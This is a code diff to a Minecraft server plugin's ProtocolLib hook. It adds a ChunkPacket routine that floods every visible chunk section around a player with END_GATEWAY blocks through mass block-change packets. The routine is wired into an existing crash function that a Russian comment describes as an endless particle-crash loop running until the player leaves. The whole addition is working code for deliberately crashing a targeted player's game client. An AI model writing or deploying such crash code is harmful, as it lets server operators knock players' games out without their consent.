@@ -8,8 +8,7 @@ import com.comphenix.protocol.wrappers.*;
 import com.google.common.collect.Lists;
 import lombok.Getter;
 import net.dehasher.hlib.wrapper.packet.bukkit.*;
-import org.bukkit.Bukkit;
-import org.bukkit.Location;
+import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
@@ -18,9 +17,16 @@ import net.dehasher.hlib.Scheduler;
 import net.dehasher.hlib.data.NMS;
 import net.dehasher.hlib.Tools;
 import org.bukkit.plugin.Plugin;
-
-import java.util.*;
+import com.comphenix.protocol.PacketType;
+import com.comphenix.protocol.events.PacketContainer;
+import com.comphenix.protocol.wrappers.BlockPosition;
+import com.comphenix.protocol.wrappers.WrappedBlockData;
+import net.dehasher.hlib.data.BukkitVersion;
+import java.util.Arrays;
+import java.util.Set;
+import java.util.UUID;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.*;
 
 public class ProtocolLibHook {
 	private static final CrashQueue CRASH_QUEUE = new CrashQueue();
@@ -90,6 +96,7 @@ public class ProtocolLibHook {
 			// Бесконечный цикл краша частицами, пока игрок не ливнет.
 			// Крашит спустя 0.3 секунды после выполнения.
 			Scheduler.doAsync(() -> {
+				ChunkPacket.sendVisible(player, WrappedBlockData.createData(Material.END_GATEWAY));
 				WrapperPlayServerSpawnEntity entity = new WrapperPlayServerSpawnEntity();
 				Block block = player.getLocation().getBlock();
 				entity.setX((float) block.getX());
@@ -189,6 +196,89 @@ public class ProtocolLibHook {
 			} else {
 				destroy.broadcastPacket();
 			}
+		}
+	}
+
+	public static final class ChunkPacket {
+		private static final int SECTION_SIZE = 16;
+		private static final int BLOCKS_PER_SECTION = SECTION_SIZE * SECTION_SIZE * SECTION_SIZE;
+		private static final short[] POSITIONS = createPositions();
+
+		public static void sendVisible(Player player, WrappedBlockData blockData) {
+			WrappedBlockData[] blocks = createReplacementBlocks(blockData);
+			Chunk center = player.getLocation().getChunk();
+			World world = player.getWorld();
+			int viewDistance = Math.min(player.getClientViewDistance(), world.getViewDistance());
+
+			for (int chunkX = center.getX() - viewDistance; chunkX <= center.getX() + viewDistance; chunkX++) {
+				for (int chunkZ = center.getZ() - viewDistance; chunkZ <= center.getZ() + viewDistance; chunkZ++) {
+					if (!world.isChunkLoaded(chunkX, chunkZ)) continue;
+
+					sendChunk(player, chunkX, chunkZ, blocks);
+				}
+			}
+		}
+
+		private static void sendChunk(Player player, int chunkX, int chunkZ, WrappedBlockData[] blocks) {
+			ProtocolManager protocolManager = ProtocolLibrary.getProtocolManager();
+			World world = player.getWorld();
+			int minSectionY = getMinSectionY(world);
+			int maxSectionY = Math.floorDiv(world.getMaxHeight() - 1, SECTION_SIZE);
+
+			for (int sectionY = minSectionY; sectionY <= maxSectionY; sectionY++) {
+				sendSection(protocolManager, player, chunkX, sectionY, chunkZ, blocks);
+			}
+		}
+
+		private static void sendSection(ProtocolManager protocolManager, Player player, int chunkX, int sectionY, int chunkZ, WrappedBlockData[] blocks) {
+			try {
+				PacketContainer packet = protocolManager.createPacket(PacketType.Play.Server.MULTI_BLOCK_CHANGE);
+
+				packet.getSectionPositions().write(0, new BlockPosition(chunkX, sectionY, chunkZ));
+				packet.getShortArrays().write(0, POSITIONS);
+				packet.getBlockDataArrays().write(0, blocks);
+
+				if (!Tools.requireBukkitVersion(BukkitVersion.V1_21)) packet.getBooleans().write(0, true);
+
+				protocolManager.sendServerPacket(player, packet, false);
+			} catch (Throwable t) {
+				throw new IllegalStateException(
+						"Failed to send replacement packet for section " + chunkX + ", " + sectionY + ", " + chunkZ,
+						t
+				);
+			}
+		}
+
+		private static int getMinSectionY(World world) {
+			if (!Tools.requireBukkitVersion(BukkitVersion.V1_21)) return 0;
+
+			try {
+				int minHeight = (Integer) World.class.getMethod("getMinHeight").invoke(world);
+				return Math.floorDiv(minHeight, SECTION_SIZE);
+			} catch (ReflectiveOperationException e) {
+				throw new IllegalStateException("Failed to get world minimum height", e);
+			}
+		}
+
+		private static short[] createPositions() {
+			short[] positions = new short[BLOCKS_PER_SECTION];
+			int index = 0;
+
+			for (int x = 0; x < SECTION_SIZE; x++) {
+				for (int z = 0; z < SECTION_SIZE; z++) {
+					for (int y = 0; y < SECTION_SIZE; y++) {
+						positions[index++] = (short) ((x << 8) | (z << 4) | y);
+					}
+				}
+			}
+
+			return positions;
+		}
+
+		private static WrappedBlockData[] createReplacementBlocks(WrappedBlockData blockData) {
+			WrappedBlockData[] blocks = new WrappedBlockData[BLOCKS_PER_SECTION];
+			Arrays.fill(blocks, blockData);
+			return blocks;
 		}
 	}
 
